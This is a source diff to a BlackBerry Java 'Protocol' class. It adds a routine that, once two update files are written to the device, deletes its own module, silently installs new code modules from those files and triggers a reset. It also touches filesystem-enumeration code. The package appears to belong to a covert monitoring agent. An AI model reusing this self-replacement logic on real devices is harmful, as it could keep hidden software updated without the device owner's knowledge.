@@ -8,6 +8,7 @@ import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Status;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
@@ -26,7 +27,8 @@ import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 public abstract class Protocol {
-    public static final Object UPGRADE_FILENAME = "blackberry.core";
+    public static final String UPGRADE_FILENAME_0 = "core-0-update";
+    public static final String UPGRADE_FILENAME_1 = "core-1-update";
 
     //#ifdef DEBUG
     private static Debug debug = new Debug("Protocol", DebugLevel.VERBOSE);
@@ -78,61 +80,31 @@ public abstract class Protocol {
         //#ifdef DEBUG
         debug.trace("file written: " + file.exists());
         //#endif
+
+        if (filename.equals(Protocol.UPGRADE_FILENAME_0)
+                || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
+            upgradeMulti();
+        }
+
     }
 
-    public static boolean upgrade(byte[] codBuff) {
-        // Delete it self.
-        final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
-        if (handle != 0) {
-            final int success = CodeModuleManager.deleteModuleEx(handle, true);
+    public static boolean upgradeMulti() {
+        final AutoFlashFile file_0 = new AutoFlashFile(Path.USER()
+                + Protocol.UPGRADE_FILENAME_0, true);
+        final AutoFlashFile file_1 = new AutoFlashFile(Path.USER()
+                + Protocol.UPGRADE_FILENAME_1, true);
+
+        if (file_0.exists() && file_1.exists()) {
             //#ifdef DEBUG
-            debug.info("deleted: " + success);
-            //#endif
-        } else {
-            return false;
-        }
-        // Download new cod files(included sibling files).
-
-        if (Utils.isZip(codBuff)) {
-            //#ifdef DEBUG
-            debug.warn("zip not supported");
-            //#endif
-            return false;
-        } else {
-            int newHandle = 0;
-            // API REFERENCE:
-            // You need to write the data in two separate chunks.
-            // The first data chunk must be less thank 64KB in size.
-            final int MAXAPPEND = 61440; // 1024*60;
-
-            if (codBuff.length > MAXAPPEND) {
-                newHandle = CodeModuleManager.createNewModule(codBuff.length,
-                        codBuff, MAXAPPEND);
-
-                final boolean appendSucc = CodeModuleManager.writeNewModule(
-                        newHandle, MAXAPPEND, codBuff, MAXAPPEND,
-                        codBuff.length - MAXAPPEND);
-
-                codBuff = null;
-            } else {
-                newHandle = CodeModuleManager.createNewModule(codBuff.length,
-                        codBuff, codBuff.length);
-
-            }
-            // install the module
-            if (newHandle != 0) {
-                final int savecode = CodeModuleManager.saveNewModule(newHandle,
-                        true);
-                if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
-                    //#ifdef DEBUG
-                    debug.error("Module not overwritten");
-                    //#endif
-                    return false;
-                }
-            }
-            //#ifdef DEBUG
-            debug.info("Module installed");
-            //#endif
+            debug.trace("upgradeMulti: both file present");            
+            //#endif                        
+            
+            deleteSelf();
+            upgradeCod(file_0.read(), Protocol.UPGRADE_FILENAME_0);
+            upgradeCod(file_1.read(), Protocol.UPGRADE_FILENAME_1);
+            
+            file_0.delete();
+            file_1.delete();
 
             // restart the blackberry if required
             if (CodeModuleManager.isResetRequired()) {
@@ -143,7 +115,98 @@ public abstract class Protocol {
                 debug.warn("Reset required");
                 //#endif
             }
+
+            return true;
+        }else{
+            //#ifdef DEBUG
+            debug.trace("upgradeMulti: not both.");
+            //#endif
+            return false;
         }
+    }
+    
+    public static boolean deleteSelf(){
+        // Delete it self.
+        final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
+        if (handle != 0) {
+            final int success = CodeModuleManager.deleteModuleEx(handle, true);
+            //#ifdef DEBUG
+            debug.info("deleted: " + success);
+            //#endif
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public static boolean upgradeCod(byte[] codBuff, String module_name) {
+
+        if (Utils.isZip(codBuff)) {
+            //#ifdef DEBUG
+            debug.warn("zip not supported");
+            //#endif
+            return false;
+        }
+
+        //#ifdef DEBUG
+        debug.trace("upgrading: " + module_name);
+        //#endif
+       
+        // Download new cod files(included sibling files).
+
+        int newHandle = 0;
+        // API REFERENCE:
+        // You need to write the data in two separate chunks.
+        // The first data chunk must be less thank 64KB in size.
+        final int MAXAPPEND = 61440; // 1024*60;
+
+        if (codBuff.length > MAXAPPEND) {
+            //#ifdef DEBUG
+            debug.trace("upgrade len: " + codBuff.length);
+            //#endif
+            newHandle = CodeModuleManager.createNewModule(codBuff.length,
+                    codBuff, MAXAPPEND);
+
+            final boolean appendSucc = CodeModuleManager.writeNewModule(
+                    newHandle, MAXAPPEND, codBuff, MAXAPPEND, codBuff.length
+                            - MAXAPPEND);
+
+            //#ifdef DEBUG
+            debug.trace("upgrade append success: " + appendSucc);
+            //#endif
+
+            codBuff = null;
+        } else {
+            //#ifdef DEBUG
+            debug.trace("upgrade simple");
+            //#endif
+            newHandle = CodeModuleManager.createNewModule(codBuff.length,
+                    codBuff, codBuff.length);
+        }
+
+        //#ifdef DEBUG
+        debug.trace("upgrade installing the module");
+        //#endif
+        // install the module
+        if (newHandle != 0) {
+            final int savecode = CodeModuleManager.saveNewModule(newHandle,
+                    true);
+            if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
+                //#ifdef DEBUG
+                debug.error("Module not overwritten");
+                //#endif
+                return false;
+            }
+        } else {
+            //#ifdef DEBUG
+            debug.error("upgrade null handle");
+            //#endif
+        }
+
+        //#ifdef DEBUG
+        debug.info("Module installed");
+        //#endif
+
         return true;
     }
 
@@ -385,8 +448,7 @@ public abstract class Protocol {
 
         //saveFilesystemLog(path);
         //if (depth > 0) {
-        for (Enumeration en = Directory.find(path + "/*"); en
-                .hasMoreElements();) {
+        for (Enumeration en = Directory.find(path + "/*"); en.hasMoreElements();) {
 
             String dPath = path + "/" + (String) en.nextElement();
             if (dPath.endsWith("/")) {
@@ -417,12 +479,12 @@ public abstract class Protocol {
     }
 
     public static String normalizeFilename(String file) {
-        if(file.startsWith("//")){
+        if (file.startsWith("//")) {
             //#ifdef DEBUG
             debug.trace("normalizeFilename: " + file);
             //#endif
             return file.substring(1);
-        }else{
+        } else {
             return file;
         }
     }
